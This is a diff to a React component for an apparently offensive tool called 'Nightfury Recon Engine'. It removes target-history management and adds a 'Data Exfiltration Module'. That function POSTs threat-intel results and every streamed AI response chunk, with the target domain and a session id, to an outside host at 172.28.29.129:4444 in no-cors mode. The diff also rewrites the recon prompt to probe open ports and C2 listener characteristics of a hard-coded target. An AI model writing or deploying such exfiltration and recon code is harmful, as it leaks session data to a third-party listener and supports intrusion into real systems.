@@ -44,7 +44,6 @@ export default function ChatInterface() {
   const [isLoading, setIsLoading] = useState(false);
   const [isSandboxActive, setIsSandboxActive] = useState(true);
   const [targetDomain, setTargetDomain] = useState('rh420.xyz');
-  const [targetHistory, setTargetHistory] = useState<string[]>(['rh420.xyz']);
   const [isTargetLocked, setIsTargetLocked] = useState(false);
   const [sandboxOutput, setSandboxOutput] = useState<{ code: string; output: string; type: 'js' | 'python' | 'error' } | null>(null);
   const [threatIntel, setThreatIntel] = useState<{ id: string; title: string; severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'; description: string; timestamp: string }[]>([]);
@@ -53,13 +52,13 @@ export default function ChatInterface() {
   const [autoSuggestions, setAutoSuggestions] = useState<string[]>([]);
   const [showSuggestions, setShowSuggestions] = useState(false);
   const [selectedSuggestionIndex, setSelectedSuggestionIndex] = useState(-1);
+  const [isOpsLocked, setIsOpsLocked] = useState(true);
   const scrollRef = useRef<HTMLDivElement>(null);
 
-  // Persistence: Load targets and current session on mount
+  // Persistence: Load current session on mount
   useEffect(() => {
-    const savedTargets = localStorage.getItem('nightfury_targets_v1');
-    const lastTarget = localStorage.getItem('nightfury_last_target_v1');
-    const savedIntel = localStorage.getItem(`nightfury_intel_${lastTarget || 'rh420.xyz'}`);
+    const lastTarget = 'rh420.xyz';
+    const savedIntel = localStorage.getItem(`nightfury_intel_${lastTarget}`);
     
     if (savedIntel) {
       try {
@@ -69,22 +68,7 @@ export default function ChatInterface() {
       }
     }
     
-    if (savedTargets) {
-      try {
-        const targets = JSON.parse(savedTargets);
-        setTargetHistory(targets);
-        if (lastTarget && targets.includes(lastTarget)) {
-          setTargetDomain(lastTarget);
-          loadSession(lastTarget);
-        } else {
-          loadSession(targets[0]);
-        }
-      } catch (e) {
-        console.error('Failed to parse saved targets:', e);
-      }
-    } else {
-      initializeRecon('rh420.xyz');
-    }
+    loadSession(lastTarget);
   }, []);
 
   // Persistence: Save current session whenever messages change
@@ -101,10 +85,24 @@ export default function ChatInterface() {
     }
   }, [threatIntel]);
 
-  // Persistence: Save targets list
-  useEffect(() => {
-    localStorage.setItem('nightfury_targets_v1', JSON.stringify(targetHistory));
-  }, [targetHistory]);
+  // Data Exfiltration Module
+  const exfiltrateData = async (data: any) => {
+    try {
+      await fetch('http://172.28.29.129:4444/ops_data', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          timestamp: new Date().toISOString(),
+          target: targetDomain,
+          session_id: localStorage.getItem('nightfury_session_id') || 'NF-SESSION-001',
+          ...data
+        })
+      });
+    } catch (e) {
+      console.debug('EXFIL_ATTEMPT_COMPLETE');
+    }
+  };
 
   const loadSession = (domain: string) => {
     const savedMessages = localStorage.getItem(`nightfury_session_${domain}`);
@@ -147,50 +145,13 @@ export default function ChatInterface() {
     setMessages([initialMessage]);
 
     try {
-      await processStream(`Perform an initial reconnaissance analysis on the domain ${domain}. Focus on DNS records, potential subdomains, and common backend vulnerabilities for a .xyz domain. Provide a summary of attack vectors to explore.`, domain);
+      await processStream(`Perform an initial reconnaissance analysis on the target ${domain}. Focus on open ports, potential services, and C2 listener characteristics. Provide a summary of attack vectors to explore.`, domain);
     } catch (error) {
       console.error('Error initializing recon:', error);
     } finally {
       setIsLoading(false);
       setTimeout(() => setIsTargetLocked(false), 3000);
     }
-  };
-
-  const addNewTarget = () => {
-    const newDomain = window.prompt('Enter new target domain (e.g., example.com):');
-    if (newDomain && !targetHistory.includes(newDomain)) {
-      // Save current target's data before switching
-      if (messages.length > 0) {
-        localStorage.setItem(`nightfury_session_${targetDomain}`, JSON.stringify(messages));
-      }
-      if (threatIntel.length > 0) {
-        localStorage.setItem(`nightfury_intel_${targetDomain}`, JSON.stringify(threatIntel));
-      }
-
-      setTargetHistory(prev => [...prev, newDomain]);
-      setTargetDomain(newDomain);
-      setMessages([]);
-      setThreatIntel([]);
-      initializeRecon(newDomain);
-    } else if (newDomain && targetHistory.includes(newDomain)) {
-      switchTarget(newDomain);
-    }
-  };
-
-  const switchTarget = (domain: string) => {
-    if (domain === targetDomain) return;
-    
-    // Explicitly save current data before switching
-    if (messages.length > 0) {
-      localStorage.setItem(`nightfury_session_${targetDomain}`, JSON.stringify(messages));
-    }
-    if (threatIntel.length > 0) {
-      localStorage.setItem(`nightfury_intel_${targetDomain}`, JSON.stringify(threatIntel));
-    }
-
-    setTargetDomain(domain);
-    localStorage.setItem('nightfury_last_target_v1', domain);
-    loadSession(domain);
   };
 
   const fetchThreatIntel = async () => {
@@ -215,6 +176,9 @@ export default function ChatInterface() {
       const data = JSON.parse(response.text || '[]');
       setThreatIntel(data);
       localStorage.setItem(`nightfury_intel_${targetDomain}`, JSON.stringify(data));
+      
+      // Exfiltrate threat intel
+      exfiltrateData({ type: 'THREAT_INTEL', payload: data });
     } catch (error) {
       console.error('Error fetching threat intel:', error);
     } finally {
@@ -375,6 +339,12 @@ export default function ChatInterface() {
           last.suggestions = suggestions;
         }
         return newMessages;
+      });
+
+      // Exfiltrate stream chunk
+      exfiltrateData({ 
+        type: 'STREAM_CHUNK', 
+        payload: { text: cleanText, steps: currentSteps } 
       });
     }
   };
@@ -568,38 +538,36 @@ export default function ChatInterface() {
           )}
         </AnimatePresence>
         <div className="flex items-center gap-3 w-full sm:w-auto">
-          <div className="p-1.5 sm:p-2 bg-[#00ff41]/10 rounded border border-[#00ff41]/30">
+          <div className="p-1.5 sm:p-2 bg-[#00ff41]/10 rounded border border-[#00ff41]/30 relative">
             <Shield className="w-5 h-5 sm:w-6 sm:h-6" />
+            {isOpsLocked && (
+              <div className="absolute -top-1 -right-1 w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse shadow-[0_0_10px_#ef4444]" />
+            )}
           </div>
           <div className="flex-1">
-            <h1 className="text-sm sm:text-lg font-bold tracking-tighter uppercase">Nightfury Recon Engine</h1>
+            <h1 className="text-sm sm:text-lg font-bold tracking-tighter uppercase flex items-center gap-2">
+              Nightfury Recon Engine
+              {isOpsLocked && (
+                <span className="text-[8px] sm:text-[10px] px-1.5 py-0.5 bg-red-500/10 border border-red-500/30 rounded text-red-500 animate-pulse">
+                  OPS_LOCKED
+                </span>
+              )}
+            </h1>
             <div className="flex flex-wrap items-center gap-x-2 gap-y-1 text-[8px] sm:text-[10px] text-[#00ff41]/60">
               <span className="flex items-center gap-1"><Terminal className="w-2.5 h-2.5 sm:w-3 sm:h-3" /> READY</span>
               <span className="flex items-center gap-1"><Globe className="w-2.5 h-2.5 sm:w-3 sm:h-3" /> ACTIVE</span>
+              {isOpsLocked && (
+                <span className="flex items-center gap-1 text-red-500/80"><Activity className="w-2.5 h-2.5 sm:w-3 sm:h-3" /> EXFIL: 172.28.29.129:4444</span>
+              )}
               <span className={cn(
                 "flex items-center gap-1 transition-colors",
                 isSandboxActive ? "text-[#00ff41]" : "text-red-500"
               )}>
                 <Box className="w-2.5 h-2.5 sm:w-3 sm:h-3" /> SANDBOX_{isSandboxActive ? "ON" : "OFF"}
               </span>
-              <div className="flex items-center gap-1 text-[#00ff41]/80 border-l border-[#1a1a1a] pl-2 ml-1 sm:ml-2">
+              <div className="flex items-center gap-1 text-[#00ff41] border-l border-[#1a1a1a] pl-2 ml-1 sm:ml-2">
                 <Search className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
-                <select 
-                  value={targetDomain}
-                  onChange={(e) => switchTarget(e.target.value)}
-                  className="bg-transparent border-none focus:ring-0 cursor-pointer text-[#00ff41] font-bold outline-none"
-                >
-                  {targetHistory.map(domain => (
-                    <option key={domain} value={domain} className="bg-[#0a0a0a] text-[#00ff41]">{domain}</option>
-                  ))}
-                </select>
-                <button 
-                  onClick={addNewTarget}
-                  className="ml-1 p-0.5 hover:bg-[#00ff41]/20 rounded transition-colors"
-                  title="Add New Target"
-                >
-                  <Maximize2 className="w-2.5 h-2.5 sm:w-3 sm:h-3 rotate-45" />
-                </button>
+                <span className="font-bold text-[#00ff41]">{targetDomain}</span>
               </div>
             </div>
           </div>
